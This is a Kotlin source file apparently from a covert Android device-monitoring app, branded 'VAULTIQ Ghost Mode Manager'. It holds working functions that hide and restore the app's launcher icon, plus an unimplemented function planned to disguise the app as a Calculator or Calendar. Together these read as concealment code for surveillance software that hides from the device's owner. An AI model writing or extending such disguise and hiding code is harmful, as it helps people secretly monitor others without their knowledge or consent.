package com.devicemonitor.utils

import android.content.ComponentName
import android.content.Context
import android.content.pm.PackageManager

/**
 * VAULTIQ Ghost Mode Manager
 * Handles Icon Hiding and Dynamic Morphing.
 */
object AppIdentityManager {

    fun hideAppIcon(context: Context) {
        val pm = context.packageManager
        val componentName = ComponentName(context, "com.devicemonitor.MainActivity")
        pm.setComponentEnabledSetting(
            componentName,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
    }

    fun showAppIcon(context: Context) {
        val pm = context.packageManager
        val componentName = ComponentName(context, "com.devicemonitor.MainActivity")
        pm.setComponentEnabledSetting(
            componentName,
            PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
            PackageManager.DONT_KILL_APP
        )
    }

    fun morphApp(context: Context, identity: String) {
        // Implementation for changing icon to Calculator/Calendar shells
        // This requires multiple <activity-alias> in Manifest
    }
}
